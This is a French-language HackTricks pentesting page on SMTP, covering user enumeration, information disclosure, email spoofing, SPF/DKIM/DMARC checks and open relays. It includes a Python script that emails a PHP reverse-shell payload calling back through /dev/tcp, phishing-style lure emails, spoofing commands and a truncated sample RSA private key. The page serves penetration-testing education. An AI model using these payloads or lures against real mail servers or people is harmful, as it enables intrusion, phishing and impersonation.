# 25,465,587 - Pentesting SMTP/s

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference est un √©v√©nement international de cybers√©curit√©**](https://www.dragonjarcon.org/) qui a plus d'une d√©cennie et qui se tiendra les 7 et 8 septembre 2023 √† Bogot√°, en Colombie. C'est un √©v√©nement de contenu technique de haut niveau o√π les derni√®res recherches en espagnol sont pr√©sent√©es, attirant des hackers et des chercheurs du monde entier.\
Inscrivez-vous d√®s maintenant sur le lien suivant et ne manquez pas cette grande conf√©rence !:

{% embed url="https://www.dragonjarcon.org/" %}

## **Informations de base**

**SMTP (Simple Mail Transfer Protocol)** est un protocole TCP/IP utilis√© pour **envoyer** et recevoir des **e-mails**. Cependant, √©tant donn√© qu'il est limit√© dans sa capacit√© √† mettre en file d'attente des messages √† l'extr√©mit√© de r√©ception, il est g√©n√©ralement utilis√© avec l'un des deux autres protocoles, POP3 ou IMAP, qui permettent √† l'utilisateur de sauvegarder des messages dans une bo√Æte aux lettres du serveur et de les t√©l√©charger p√©riodiquement √† partir du serveur.

En d'autres termes, **les utilisateurs utilisent g√©n√©ralement** un programme qui utilise **SMTP pour envoyer des e-mails** et soit **POP3 ou IMAP pour recevoir** des e-mails. Sur les syst√®mes bas√©s sur Unix, **sendmail** est le serveur SMTP le plus largement utilis√© pour les e-mails. Un package commercial, Sendmail, inclut un serveur POP3. **Microsoft Exchange** inclut un serveur SMTP et peut √©galement √™tre configur√© pour inclure le support POP3.\
√Ä partir de [ici](https://whatis.techtarget.com/definition/SMTP-Simple-Mail-Transfer-Protocol).

**Port par d√©faut :** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### En-t√™tes EMAIL

Si vous avez l'opportunit√© de **faire envoyer un email √† la victime** (via le formulaire de contact de la page web par exemple), faites-le car **vous pourriez en apprendre sur la topologie interne** de la victime en regardant les en-t√™tes du mail.

Vous pouvez √©galement obtenir un email d'un serveur SMTP en essayant de **lui envoyer un email √† une adresse inexistante** (car le serveur enverra √† l'attaquant un mail NDN). Mais, assurez-vous d'envoyer l'email depuis une adresse autoris√©e (v√©rifiez la politique SPF) et que vous pouvez recevoir des messages NDN.

Vous devriez √©galement essayer d'**envoyer diff√©rents contenus car vous pouvez trouver des informations plus int√©ressantes** dans les en-t√™tes comme: `X-Virus-Scanned: by av.domain.com`\
Vous devriez envoyer le fichier de test EICAR.\
La d√©tection de l'**AV** peut vous permettre d'exploiter des **vuln√©rabilit√©s connues.**

## Actions de base

### **Banner Grabbing/Connexion de base**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:

SMTPS (Simple Mail Transfer Protocol Secure) est une version s√©curis√©e de SMTP qui utilise SSL/TLS pour chiffrer les communications entre le client et le serveur. Le port par d√©faut pour SMTPS est le 465. Les √©tapes pour se connecter √† un serveur SMTPS sont similaires √† celles de SMTP, mais avec l'ajout de la configuration de la connexion SSL/TLS.
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### Trouver les serveurs MX d'une organisation

To find the MX servers of an organization, we can use the `nslookup` command in the terminal. First, we need to set the query type to MX and then enter the domain name of the organization.

Pour trouver les serveurs MX d'une organisation, nous pouvons utiliser la commande `nslookup` dans le terminal. Tout d'abord, nous devons d√©finir le type de requ√™te sur MX, puis entrer le nom de domaine de l'organisation.

```bash
nslookup -type=mx domain.com
```

This will return a list of MX servers for the domain.

Cela renverra une liste de serveurs MX pour le domaine.
```bash
dig +short mx google.com
```
### √ânum√©ration

---

#### SMTP User Enumeration

#### √ânum√©ration d'utilisateurs SMTP

SMTP user enumeration can be performed in several ways:

L'√©num√©ration d'utilisateurs SMTP peut √™tre effectu√©e de plusieurs mani√®res :

##### VRFY Command

##### Commande VRFY

The VRFY command is used to verify the existence of a user. If the server responds with a 252 code, the user exists.

La commande VRFY est utilis√©e pour v√©rifier l'existence d'un utilisateur. Si le serveur r√©pond avec un code 252, l'utilisateur existe.

```
VRFY <username>
```

##### EXPN Command

##### Commande EXPN

The EXPN command is used to expand a mailing list. If the server responds with a 250 code, the mailing list exists.

La commande EXPN est utilis√©e pour √©tendre une liste de diffusion. Si le serveur r√©pond avec un code 250, la liste de diffusion existe.

```
EXPN <mailing_list>
```

##### RCPT TO Command

##### Commande RCPT TO

The RCPT TO command is used to verify if an email address is valid. If the server responds with a 250 code, the email address exists.

La commande RCPT TO est utilis√©e pour v√©rifier si une adresse e-mail est valide. Si le serveur r√©pond avec un code 250, l'adresse e-mail existe.

```
RCPT TO: <email_address>
```

##### User Enumeration Script

##### Script d'√©num√©ration d'utilisateurs

A script can be used to automate the user enumeration process. The following is an example script that can be used to enumerate users using the VRFY command:

Un script peut √™tre utilis√© pour automatiser le processus d'√©num√©ration d'utilisateurs. Voici un exemple de script qui peut √™tre utilis√© pour √©num√©rer les utilisateurs en utilisant la commande VRFY :

```python
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
    print "Usage: vrfy.py <server_ip> <user_list>"
    sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((sys.argv[1],25))
banner=s.recv(1024)
print banner

users = open(sys.argv[2], "r")

for user in users:
    s.send('VRFY ' + user)
    result=s.recv(1024)
    print result

s.close()
```

The script takes two arguments: the IP address of the SMTP server and a file containing a list of usernames to enumerate.

Le script prend deux arguments : l'adresse IP du serveur SMTP et un fichier contenant une liste de noms d'utilisateurs √† √©num√©rer.
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - Divulgation d'informations

Si le serveur prend en charge l'authentification NTLM (Windows), vous pouvez obtenir des informations sensibles (versions). Plus d'informations [**ici**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587 
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
>> AUTH NTLM 334 
NTLM supported 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
Ou **automatisez** cela avec le plugin `smtp-ntlm-info.nse` de **nmap**

### Nom du serveur interne - Divulgation d'informations

Certains serveurs SMTP compl√®tent automatiquement l'adresse de l'exp√©diteur lorsqu'une commande "MAIL FROM" est √©mise sans adresse compl√®te, divulguant ainsi son nom interne :
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200 
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

V√©rifiez si vous pouvez renifler des mots de passe √† partir des paquets envoy√©s au port 25.

### [Bruteforce d'authentification](../../generic-methodologies-and-resources/brute-force.md#smtp)

## √ânum√©ration de bruteforce de nom d'utilisateur

**L'authentification n'est pas toujours n√©cessaire**

### RCPT TO
```bash
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
MAIL FROM:test@test.org
250 2.1.0 test@test.org... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY

VRFY est une commande SMTP qui permet de v√©rifier si un utilisateur existe sur un serveur de messagerie. Cette commande peut √™tre utilis√©e par un attaquant pour collecter des informations sur les utilisateurs valides d'un domaine. 

Pour utiliser la commande VRFY, il suffit d'envoyer une requ√™te VRFY suivie du nom d'utilisateur √† v√©rifier. Si l'utilisateur existe, le serveur de messagerie r√©pondra avec un code 250 et le nom de l'utilisateur. Si l'utilisateur n'existe pas, le serveur de messagerie r√©pondra avec un code 550.

Il est important de noter que de nombreux serveurs de messagerie d√©sactivent la commande VRFY pour des raisons de s√©curit√©. Cependant, si la commande est activ√©e, elle peut √™tre utilis√©e pour collecter des informations sur les utilisateurs valides, qui peuvent ensuite √™tre utilis√©es dans des attaques de phishing ou de force brute.
```
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```
### EXPN

La commande EXPN est utilis√©e pour v√©rifier si une adresse e-mail existe sur le serveur de messagerie. Elle peut √©galement √™tre utilis√©e pour obtenir des informations sur les alias de messagerie et les listes de diffusion. Cependant, cette commande peut √©galement √™tre utilis√©e par les attaquants pour collecter des informations sur les utilisateurs et les adresses e-mail valides sur le serveur. Il est donc recommand√© de d√©sactiver cette commande sur le serveur de messagerie pour √©viter les fuites d'informations.
```
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```
### Outils automatiques

#### Metasploit

Metasploit est un framework d'exploitation qui contient un module pour tester la vuln√©rabilit√© de l'authentification SMTP. Le module `smtp_enum` peut √™tre utilis√© pour tester la validit√© des adresses e-mail en utilisant une liste de noms d'utilisateurs. 

#### Nmap

Nmap est un scanner de ports qui peut √™tre utilis√© pour identifier les serveurs SMTP. Il peut √©galement √™tre utilis√© pour v√©rifier si une adresse e-mail est valide en envoyant une requ√™te VRFY ou EXPN. 

#### SMTP-user-enum

SMTP-user-enum est un outil open source qui peut √™tre utilis√© pour tester la validit√© des adresses e-mail en utilisant une liste de noms d'utilisateurs. Il peut √©galement √™tre utilis√© pour v√©rifier si une adresse e-mail est valide en envoyant une requ√™te VRFY ou EXPN. 

#### Send-Safe

Send-Safe est un outil commercial qui peut √™tre utilis√© pour tester la validit√© des adresses e-mail en utilisant une liste de noms d'utilisateurs. Il peut √©galement √™tre utilis√© pour v√©rifier si une adresse e-mail est valide en envoyant une requ√™te VRFY ou EXPN.
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference est un √©v√©nement international de cybers√©curit√©**](https://www.dragonjarcon.org/) qui a plus d'une d√©cennie et qui se tiendra les 7 et 8 septembre 2023 √† Bogot√°, en Colombie. C'est un √©v√©nement de contenu technique √©lev√© o√π les derni√®res recherches en espagnol sont pr√©sent√©es, attirant des hackers et des chercheurs du monde entier.\
Inscrivez-vous d√®s maintenant sur le lien suivant et ne manquez pas cette grande conf√©rence!:

{% embed url="https://www.dragonjarcon.org/" %}

## Rapports DSN

**Delivery Status Notification Reports**: Si vous envoyez un **e-mail** √† une organisation √† une **adresse invalide**, l'organisation vous notifiera que l'adresse √©tait invalide en envoyant un **e-mail de retour**. Les **en-t√™tes** de l'e-mail retourn√© **contiendront** des informations sensibles possibles (comme l'adresse IP des services de messagerie qui ont interagi avec les rapports ou des informations sur les logiciels antivirus).

## [Commandes](smtp-commands.md)

### Envoyer un e-mail depuis la console linux
```
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
 swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Envoyer un e-mail avec Python

Voici une alternative pour envoyer un e-mail avec un script Python.
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = "" 
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload 
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
    print("[-]Connection Error")
    exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## Spoofing de courrier

La plupart de cette section a √©t√© extraite du livre **Network Security Assessment 3rd Edition**.

Les messages SMTP sont facilement falsifi√©s, c'est pourquoi les organisations utilisent les fonctionnalit√©s **SPF**, **DKIM** et **DMARC** pour emp√™cher les parties d'envoyer des courriers √©lectroniques non autoris√©s.

Un **guide complet de ces contre-mesures** peut √™tre trouv√© sur [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)

### SPF

{% hint style="danger" %}
SPF [a √©t√© "d√©pr√©ci√©" en 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). Cela signifie qu'au lieu de cr√©er un **enregistrement TXT** dans `_spf.domain.com`, vous le cr√©ez dans `domain.com` en utilisant la **m√™me syntaxe**.\
De plus, pour r√©utiliser les enregistrements spf pr√©c√©dents, il est courant de trouver quelque chose comme `"v=spf1 include:_spf.google.com ~all"`
{% endhint %}

Le **Sender Policy Framework** (SPF) fournit un m√©canisme qui permet aux MTAs de v√©rifier si un h√¥te envoyant un courrier √©lectronique est autoris√©.\
Ensuite, les organisations peuvent d√©finir une liste de serveurs de messagerie autoris√©s et les MTAs peuvent interroger ces listes pour v√©rifier si le courrier √©lectronique a √©t√© falsifi√© ou non.\
Afin de d√©finir les adresses IP/plages, les domaines et autres qui sont **autoris√©s √† envoyer des courriers √©lectroniques au nom d'un nom de domaine**, diff√©rents "**M√©canismes**" peuvent appara√Ætre dans le registre SPF.

#### M√©canismes

| M√©canisme | Description                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | Correspond toujours ; utilis√© pour un r√©sultat par d√©faut comme `-all` pour toutes les adresses IP qui ne correspondent pas aux m√©canismes pr√©c√©dents.                                                                                                                                                                                                                                  |
| A         | Si le nom de domaine a un enregistrement d'adresse (A ou AAAA) qui peut √™tre r√©solu vers l'adresse de l'exp√©diteur, il correspondra.                                                                                                                                                                                                                   |
| IP4       | Si l'exp√©diteur se trouve dans une plage d'adresses IPv4 donn√©e, correspondance.                                                                                                                                                                                                                                                                              |
| IP6       | Si l'exp√©diteur se trouve dans une plage d'adresses IPv6 donn√©e, correspondance.                                                                                                                                                                                                                                                                              |
| MX        | Si le nom de domaine a un enregistrement MX r√©solvant l'adresse de l'exp√©diteur, il correspondra (c'est-√†-dire que le courrier provient de l'un des serveurs de courrier entrant du domaine).                                                                                                                                                                          |
| PTR       | Si le nom de domaine (enregistrement PTR) pour l'adresse du client est dans le domaine donn√© et que ce nom de domaine se r√©sout √† l'adresse du client (DNS inverse confirm√© par avance), correspondance. Ce m√©canisme est d√©courag√© et doit √™tre √©vit√©, si possible.                                                                                     |
| EXISTS    | Si le nom de domaine donn√© se r√©sout √† une adresse quelconque, correspondance (peu importe l'adresse √† laquelle il se r√©sout). Ceci est rarement utilis√©. Avec le langage macro SPF, il offre des correspondances plus complexes comme les requ√™tes DNSBL.                                                                                                                           |
| INCLUDE   | R√©f√©rence la politique d'un autre domaine. Si la politique de ce domaine est accept√©e, ce m√©canisme est accept√©. Cependant, si la politique incluse √©choue, le traitement se poursuit. Pour d√©l√©guer compl√®tement √† la politique d'un autre domaine, l'extension de redirection doit √™tre utilis√©e.                                                                                     |
| REDIRECT  | <p>Une redirection est un pointeur vers un autre nom de domaine qui h√©berge une politique SPF, elle permet √† plusieurs domaines de partager la m√™me politique SPF. Elle est utile lorsqu'on travaille avec un grand nombre de domaines qui partagent la m√™me infrastructure de messagerie √©lectronique.</p><p>La politique SPF du domaine indiqu√© dans le m√©canisme de redirection sera utilis√©e.</p> |

Il est √©galement possible d'identifier des **Qualificateurs** qui indiquent **ce qui doit √™tre fait si un m√©canisme correspond**. Par d√©faut, le **qualificateur "+"** est utilis√© (donc si un m√©canisme correspond, cela signifie qu'il est autoris√©).\
Vous remarquerez g√©n√©ralement **√† la fin de chaque politique SPF** quelque chose comme : **\~all** ou **-all**. Cela est utilis√© pour indiquer que **si l'exp√©diteur ne correspond √† aucune politique SPF, vous devez marquer le courrier √©lectronique comme non fiable (\~) ou rejeter (-) le courrier √©lectronique.**

#### Qualificateurs

Chaque m√©canisme peut √™tre combin√© avec l'un des quatre qualificateurs suivants :

* **`+`** pour un r√©sultat PASS. Cela peut √™tre omis ; par exemple, `+mx` est identique √† `mx`.
* **`?`** pour un r√©sultat NEUTRAL interpr√©t√© comme NONE (aucune politique).
* **`~`** (tilde) pour SOFTFAIL, une aide au d√©bogage entre NEUTRAL et FAIL. En g√©n√©ral, les messages qui renvoient un SOFTFAIL sont accept√©s mais √©tiquet√©s.
* **`-`** (moins) pour FAIL, le courrier doit √™tre rejet√© (voir ci-dessous).

Dans l'exemple suivant, vous pouvez lire la **politique SPF de google.com**. Notez comment la **premi√®re politique SPF inclut les politiques SPF d'autres domaines :**
```shell-session
kali@kali:~$ dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

kali@kali:~$ dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

kali@kali:~$ dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

kali@kali:~$ dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

kali@kali:~$ dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
Traditionnellement, il √©tait possible de falsifier n'importe quel nom de domaine qui n'avait pas d'enregistrement SPF correct ou inexistant. De nos jours, si un e-mail provient d'un domaine sans enregistrement SPF valide, il sera probablement rejet√©/marqu√© comme non fiable automatiquement.

Pour v√©rifier le SPF d'un domaine, vous pouvez utiliser des outils en ligne comme : [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM

DomainKeys Identified Mail (DKIM) est un m√©canisme par lequel les e-mails sortants sont sign√©s et valid√©s par des MTA √©trangers lors de la r√©cup√©ration de la cl√© publique d'un domaine via DNS. La cl√© publique DKIM est contenue dans un enregistrement TXT pour un domaine ; cependant, vous devez conna√Ætre √† la fois le s√©lecteur et le nom de domaine pour la r√©cup√©rer.

Ensuite, pour demander la cl√©, vous avez besoin du nom de domaine et du s√©lecteur du courrier √† partir de l'en-t√™te du courrier `DKIM-Signature`, par exemple : `d=gmail.com;s=20120113`
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg
KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC

Domain-based Message Authentication, Reporting & Conformance (DMARC) est une m√©thode d'authentification de courrier √©lectronique qui √©tend SPF et DKIM. Les politiques indiquent aux serveurs de messagerie comment traiter les e-mails pour un domaine donn√© et signalent les actions effectu√©es.

![](<../../.gitbook/assets/image (134).png>)

**Pour obtenir l'enregistrement DMARC, vous devez interroger le sous-domaine \_dmarc**
```shell-session
root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC
_dmarc.yahoo.com.  1785 IN TXT "v=DMARC1\; p=reject\; sp=none\; pct=100\; 
rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\;"

root@kali:~# dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com. 600 IN TXT "v=DMARC1\; p=quarantine\; rua=mailto:mailauth-reports@google.com"

root@kali:~# dig _dmarc.paypal.com txt | grep DMARC
_dmarc.paypal.com. 300 IN TXT "v=DMARC1\; p=reject\; rua=mailto:d@rua.agari.com\; 
ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com"
```
PayPal et Yahoo demandent aux serveurs de messagerie de rejeter les messages qui contiennent des signatures DKIM invalides ou qui ne proviennent pas de leurs r√©seaux. Des notifications sont ensuite envoy√©es aux adresses e-mail respectives de chaque organisation. Google est configur√© de mani√®re similaire, bien qu'il demande aux serveurs de messagerie de mettre en quarantaine les messages et de ne pas les rejeter directement.

#### Balises DMARC

| Nom de la balise | Objectif                                       | Exemple                         |
| ---------------- | ---------------------------------------------- | ------------------------------- |
| v                | Version du protocole                           | v=DMARC1                       |
| pct              | Pourcentage de messages soumis √† un filtrage  | pct=20                         |
| ruf              | URI de notification pour les rapports forensiques | ruf=mailto:authfail@example.com |
| rua              | URI de notification pour les rapports agr√©g√©s | rua=mailto:aggrep@example.com   |
| p                | Politique pour le domaine organisationnel      | p=quarantine                   |
| sp               | Politique pour les sous-domaines du DO         | sp=reject                      |
| adkim            | Mode d'alignement pour DKIM                     | adkim=s                        |
| aspf             | Mode d'alignement pour SPF                      | aspf=r                         |

### **Et les sous-domaines ?**

**√Ä partir de** [**ici**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
Vous devez avoir des enregistrements SPF s√©par√©s pour chaque sous-domaine √† partir duquel vous souhaitez envoyer des e-mails.\
Ce qui suit a √©t√© initialement publi√© sur openspf.org, qui √©tait autrefois une excellente ressource pour ce genre de choses.

> La question du d√©mon : Et les sous-domaines ?
>
> Si je re√ßois un e-mail de pielovers.demon.co.uk et qu'il n'y a pas de donn√©es SPF pour pielovers, dois-je revenir d'un niveau et tester SPF pour demon.co.uk ? Non. Chaque sous-domaine chez Demon est un client diff√©rent, et chaque client peut avoir sa propre politique. Il ne serait pas logique que la politique de Demon s'applique par d√©faut √† tous ses clients ; si Demon veut le faire, il peut mettre en place des enregistrements SPF pour chaque sous-domaine.
>
> Ainsi, le conseil aux √©diteurs SPF est le suivant : vous devez ajouter un enregistrement SPF pour chaque sous-domaine ou nom d'h√¥te qui a un enregistrement A ou MX.
>
> Les sites avec des enregistrements A ou MX g√©n√©riques doivent √©galement avoir un enregistrement SPF g√©n√©rique, de la forme : \* IN TXT "v=spf1 -all"

Cela a du sens - un sous-domaine peut tr√®s bien √™tre dans un endroit g√©ographique diff√©rent et avoir une d√©finition SPF tr√®s diff√©rente.

### **Relais ouverts**

Pour √©viter que les e-mails envoy√©s ne soient filtr√©s par les filtres anti-spam et ne parviennent pas au destinataire, l'exp√©diteur peut utiliser un **serveur relais que le destinataire fait confiance**. Souvent, les administrateurs **n'ont pas une vue d'ensemble** des plages d'**adresses IP** qu'ils doivent **autoriser**. Cela entra√Æne une mauvaise configuration du serveur SMTP que nous trouvons encore souvent lors de tests de p√©n√©tration externes et internes. Par cons√©quent, ils **autorisent toutes les adresses IP** pour ne pas causer d'erreurs dans le trafic de messagerie et ainsi ne pas perturber ou interrompre involontairement la communication avec les clients potentiels et actuels :
```shell-session
mynetworks = 0.0.0.0/0
```

```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **Outils**

* [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **V√©rifiez les erreurs de configuration SPF et DMARC**
* [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **Obtenez automatiquement les configurations SPF et DMARC**

### Envoyer un e-mail falsifi√©

* [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
* [**http://www.anonymailer.net/**](http://www.anonymailer.net)
* [**https://emkei.cz/**](https://emkei.cz/)\*\*\*\*

**Ou vous pouvez utiliser un outil:**

* [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)\*\*\*\*
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
{% hint style="warning" %}
Si vous rencontrez une **erreur lors de l'utilisation de la biblioth√®que python dkim** pour l'analyse de la cl√©, n'h√©sitez pas √† utiliser celle-ci.\
**REMARQUE**: Il s'agit simplement d'une solution rapide pour effectuer des v√©rifications rapides dans les cas o√π, pour une raison quelconque, la cl√© priv√©e openssl **ne peut pas √™tre analys√©e par dkim**.
```
-----BEGIN RSA PRIVATE KEY-----
MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
